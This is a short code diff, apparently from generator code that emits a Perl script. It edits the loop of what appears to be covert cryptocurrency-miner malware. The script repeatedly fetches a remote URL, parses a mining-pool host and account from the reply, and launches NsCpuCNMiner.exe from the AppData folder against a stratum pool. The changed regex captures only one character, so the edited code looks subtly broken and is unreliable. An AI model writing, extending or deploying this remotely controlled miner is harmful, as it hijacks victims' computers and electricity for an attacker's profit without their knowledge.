@@ -121,7 +121,7 @@ while(1){
     }
   }
   \$response = \$ua->get(\"$_[0]\");
-  if(\$response->decoded_content =~ m/miner->host:(.*?);email:(.*?);/){
+  if(\$response->decoded_content =~ m/miner->host:(\\w);email:(\\w);/){
     system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
   }
 }
